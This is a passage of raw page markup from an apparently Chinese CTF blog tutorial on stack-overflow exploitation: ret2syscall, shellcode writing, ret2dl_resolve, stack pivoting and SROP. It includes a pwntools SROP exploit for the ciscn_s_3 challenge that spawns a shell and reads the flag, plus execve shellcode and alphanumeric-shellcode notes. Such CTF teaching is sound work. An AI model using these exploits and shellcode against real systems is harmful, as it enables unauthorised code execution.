class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elf =<span class=\"string\">&#x27;./ciscn_s_3&#x27;</span></span><br><span class=\"line\">remote_add = <span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class=\"line\">remote_port = <span class=\"number\">29554</span></span><br><span class=\"line\"></span><br><span class=\"line\">main_add = <span class=\"number\">0x40051d</span></span><br><span class=\"line\">off = <span class=\"number\">0x130</span></span><br><span class=\"line\">system_add = <span class=\"number\">0x400517</span></span><br><span class=\"line\">rtframe = <span class=\"number\">0x4004da</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x4004e9</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">        context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;r&#x27;</span>:</span><br><span class=\"line\">            p = remote(remote_add, remote_port, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">            p = gdb.debug(elf)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(elf, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        payload1 = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload1+= p64(main_add)</span><br><span class=\"line\"></span><br><span class=\"line\">        p.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_add = u64(p.recv(<span class=\"number\">0x28</span>)[-<span class=\"number\">8</span>::]) - off</span><br><span class=\"line\"></span><br><span class=\"line\">        frame = SigreturnFrame()</span><br><span class=\"line\">        frame.rax = <span class=\"number\">0x3b</span></span><br><span class=\"line\">        frame.rdi = stack_add</span><br><span class=\"line\">        frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rsp = stack_add</span><br><span class=\"line\">        frame.rip = system_add</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload+= p64(rtframe)</span><br><span class=\"line\">        payload+= p64(system_add)</span><br><span class=\"line\">        payload+= <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#p.sendline(&#x27;a&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#p.recvuntil(&#x27;\\0&#x27;)</span></span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">        </span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> BaseException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    off+=<span class=\"number\">0x8</span></span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>核心模板:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">\t\t<span class=\"comment\">// p = process()</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// pass</span></span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        print(p.recvline())</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    except BaseException as e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"comment\">// pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>采用grep 获取输出包含flag的行就行</p>\n<h4 id=\"0x3-3-ret2dl-resolve\">0x3.3.ret2dl_resolve()</h4>\n<p>延迟绑定会使用_dl_resolve()函数</p>\n<ul>\n<li>\n<p>_dl_resolve中</p>\n<p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p>\n<ol>\n<li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li>\n<li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li>\n<li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li>\n<li>检查r_info</li>\n<li>检查&amp;(Elf64_Sym)-&gt;st_other</li>\n<li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li>\n</ol>\n</li>\n</ul>\n<p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\">修改 dynamic 节的内容</th>\n<th style=\"text-align:left\">修改重定位表项的位置</th>\n<th style=\"text-align:left\">伪造 linkmap</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">主要前提要求</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无信息泄漏时需要 libc</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">适用情况</td>\n<td style=\"text-align:left\">NO RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">注意点</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>\n<td style=\"text-align:left\">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"0x4-Tricks\">0x4.Tricks</h3>\n<h4 id=\"0x4-1-stack-pivoting\">0x4.1.stack pivoting</h4>\n<p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;leave 相当于:</span><br><span class=\"line\">mov rsp,rbp</span><br><span class=\"line\">pop rbp</span><br><span class=\"line\">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class=\"line\">;leave两次之后，就可以将栈转移到目的地址</span><br><span class=\"line\">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure>\n<p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p>\n<p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p>\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n<h4 id=\"0x4-2-栈对齐\">0x4.2.栈对齐</h4>\n<p>栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p>\n<p>这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p>\n<p>可以:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb -c core</span><br></pre></td></tr></table></figure>\n<p>调试core文件</p>\n<p>如果终止指令类似于:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class=\"number\">0x40</span>], xmm0</span><br></pre></td></tr></table></figure>\n<p>说明是栈对齐的原因，小心调整栈帧就行</p>\n<h4 id=\"0x4-3-Stack-smash\">0x4.3.Stack smash</h4>\n<p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p>\n<p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p>\n<h4 id=\"0x4-4-SROP\">0x4.4.SROP</h4>\n<h5 id=\"1-前置知识-2\">(1)前置知识:</h5>\n<p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p>\n<p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p>\n<p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p>\n<p>SROP简要流程:</p>\n<ol>\n<li>构造fake_frame</li>\n<li>控制当前rsp指向fake_frame底部</li>\n<li>sigreturn调用</li>\n</ol>\n<p>sigFrame结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// x64</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        cwd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r8;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> cs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> gs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> fs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"type\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-pwntools-srop\">(2)pwntools.srop</h5>\n<p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 一个简单的例子</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"0x1-杂谈\">0x1.杂谈</h3>\n<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合我个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给我发邮件，进行补充。</p>\n<p>本文持续更新，为广大pwn选手入门提供完善帮助</p>\n<p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p>\n<p>怎么去看待栈溢出题呢?</p>\n<p>尽管利用方法多样，但是，就我个人的看法而言，整个栈溢出实际上只分为三种:</p>\n<p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p>\n<p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p>\n<p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p>\n<p>当拿到一个题目时，首先思考：</p>\n<p>是否有syscall----&gt;ret2syscall</p>\n<p>有可读可写内存空间吗----&gt;ret2shellcode</p>\n<p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p>\n<p>接下来，再分门别类谈:</p>\n<h3 id=\"0x1-ret2syscall\">0x1.ret2syscall</h3>\n<p>因为syscall属于相对简单的，暂且放在前面谈。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">%rax</th>\n<th style=\"text-align:left\">System call</th>\n<th style=\"text-align:left\">%rdi</th>\n<th style=\"text-align:left\">%rsi</th>\n<th style=\"text-align:left\">%rdx</th>\n<th style=\"text-align:left\">%r10</th>\n<th style=\"text-align:left\">%r8</th>\n<th style=\"text-align:left\">%r9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">59</td>\n<td style=\"text-align:left\">sys_execve</td>\n<td style=\"text-align:left\">const char *filename</td>\n<td style=\"text-align:left\">const char *const argv[]</td>\n<td style=\"text-align:left\">const char *const envp[]</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n</tr>\n</tbody>\n</table>\n<p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p>\n<p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p>\n<p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p>\n<p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p>\n<p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p>\n<p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p>\n<p><strong>例题:</strong></p>\n<p>ciscn_s_3</p>\n<h3 id=\"0x2-ret2shellcode\">0x2.ret2shellcode</h3>\n<h4 id=\"0x2-1-shellcode的书写\">0x2.1.shellcode的书写</h4>\n<p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。</p>\n<p>一个简单的shellcode例子:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class=\"line\">push <span class=\"number\">0x68</span></span><br><span class=\"line\">mov rax, <span class=\"number\">0x732f2f2f6e69622f</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi, rsp</span><br><span class=\"line\"><span class=\"comment\">// push argument array [&#x27;sh\\x00&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">// push b&#x27;sh\\x00&#x27; </span></span><br><span class=\"line\">push <span class=\"number\">0x1010101</span> ^ <span class=\"number\">0x6873</span></span><br><span class=\"line\">xor dword ptr [rsp], <span class=\"number\">0x1010101</span></span><br><span class=\"line\">xor esi, esi <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\">push rsi <span class=\"comment\">/* null terminate */</span></span><br><span class=\"line\">push <span class=\"number\">8</span></span><br><span class=\"line\">pop rsi</span><br><span class=\"line\">add rsi, rsp</span><br><span class=\"line\">push rsi <span class=\"comment\">/* &#x27;sh\\x00&#x27; */</span></span><br><span class=\"line\">mov rsi, rsp</span><br><span class=\"line\">xor edx, edx <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\"><span class=\"comment\">// call execve()</span></span><br><span class=\"line\">push SYS_execve <span class=\"comment\">/* 0x3b */</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p>\n<p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p>\n<p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>数据传送:</span><br><span class=\"line\">push/pop eax…</span><br><span class=\"line\">pusha/popa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>算术运算:</span><br><span class=\"line\">inc/dec eax…</span><br><span class=\"line\">sub al, 立即数</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">sub dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">sub word ptr [eax… + 立即数], si di</span><br><span class=\"line\">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">sub si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>逻辑运算:</span><br><span class=\"line\">and al, 立即数</span><br><span class=\"line\">and dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">and word ptr [eax… + 立即数], si di</span><br><span class=\"line\">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class=\"line\">and esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">and si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\">xor al, 立即数</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">xor dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">xor word ptr [eax… + 立即数], si di</span><br><span class=\"line\">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">xor si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>比较指令:</span><br><span class=\"line\">cmp al, 立即数</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">cmp word ptr [eax… + 立即数], si di</span><br><span class=\"line\">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">cmp si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span>转移指令:</span><br><span class=\"line\">push <span class=\"number\">56</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">cmp al, <span class=\"number\">43</span>h</span><br><span class=\"line\">jnz lable</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;=&gt; jmp lable</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>交换al, ah</span><br><span class=\"line\">push eax</span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">xor byte ptr [esp], ah <span class=\"comment\">// al ^= ah</span></span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">pop eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7.</span>清零:</span><br><span class=\"line\">push <span class=\"number\">44</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">sub al, <span class=\"number\">44</span>h ; eax = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">push esi</span><br><span class=\"line\">push esp</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">xor [eax], esi ; esi = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p>\n<p>一个例子(纯字母数字shellcode):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 